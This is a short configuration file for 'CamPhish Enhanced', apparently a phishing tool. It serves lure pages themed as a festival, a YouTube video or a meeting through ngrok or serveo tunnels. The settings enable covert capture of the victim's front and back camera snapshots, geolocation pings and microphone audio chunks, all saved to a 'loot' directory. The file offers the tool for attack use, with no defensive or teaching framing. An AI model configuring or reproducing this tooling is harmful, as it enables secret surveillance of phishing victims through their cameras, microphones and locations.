# CamPhish Enhanced Configuration
# Edit these defaults or override via CLI flags in camphish_auto.sh

# Tunnel: ngrok | serveo
TUNNEL=ngrok

# Template: festival | youtube | meeting
TEMPLATE=meeting

# Camera mode: front | back | both
CAMERA_MODE=both

# Snapshot interval in milliseconds
SNAPSHOT_INTERVAL=1500

# Geolocation tracking
LOCATION_ENABLED=true
# Location ping interval in milliseconds
LOCATION_INTERVAL=2000

# Microphone recording
MIC_ENABLED=true
# Audio chunk duration in milliseconds
MIC_CHUNK_DURATION=10000

# Output directory for loot
OUTPUT_DIR=./loot

# Ngrok auth token (set this or pass via --ngrok-token)
NGROK_AUTH_TOKEN=

# Serveo subdomain (leave empty for random)
SERVEO_SUBDOMAIN=

# Festival name (for festival template)
FESTIVAL_NAME=

# YouTube video ID (for youtube template)
YOUTUBE_VIDEO_ID=

# Auto-open browser with phishing link
AUTO_OPEN_BROWSER=false

# PHP server port
PHP_PORT=3333
